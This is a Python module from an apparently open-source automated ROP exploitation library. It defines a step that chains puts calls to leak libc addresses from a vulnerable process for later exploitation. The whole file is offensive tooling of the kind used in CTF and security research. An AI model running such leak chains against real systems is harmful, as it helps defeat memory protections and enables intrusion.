from autorop import PwnState, Pipe, arutil, constants
from pwn import ROP
from typing import Iterable


class Puts(Pipe):
    def __init__(
        self,
        short: bool = False,
        leak_symbols: Iterable[str] = ["__libc_start_main", "puts"],
    ):
        """Leak libc addresses using ``puts``.

        This returns a callable which opens a new target, and leaks
        the addresses of (by default) ``__libc_start_main`` and ``puts`` using ``puts``,
        placing them in ``state.leaks``.

        Arguments:
            short: Whether the attack should be minimised i.e. leak only one address.
            leak_symbols: What symbols should be leaked.

        Returns:
            Function which takes the state, and returns the mutated ``PwnState``,
            with the following updated

                - ``target``: The fresh instance of target from which we got a successful leak.
                  Hopefully it can still be interacted with.
                - ``leaks``: Updated with ``"symbol": address`` pairs for each
                  address that was leaked.
        """
        super().__init__((short, leak_symbols))
        self.leak_symbols = leak_symbols
        if short:
            self.leak_symbols = [next(iter(leak_symbols))]

    def __call__(self, state: PwnState) -> PwnState:
        """Transform the given state with the results of the leak via ``printf``.

        Arguments:
            state: The current ``PwnState``.

        Returns:
            The mutated ``PwnState``, with the following updated

                - ``target``: The fresh instance of target from which we got a successful leak.
                  Hopefully it can still be interacted with.
                - ``leaks``: Updated with the ``"symbol": address`` pairs for each function address of libc that was leaked.
        """

        def leaker(rop: ROP, address: int) -> ROP:
            arutil.align_call(rop, "puts", [address])
            return rop

        return arutil.leak_helper(state, leaker, self.leak_symbols)
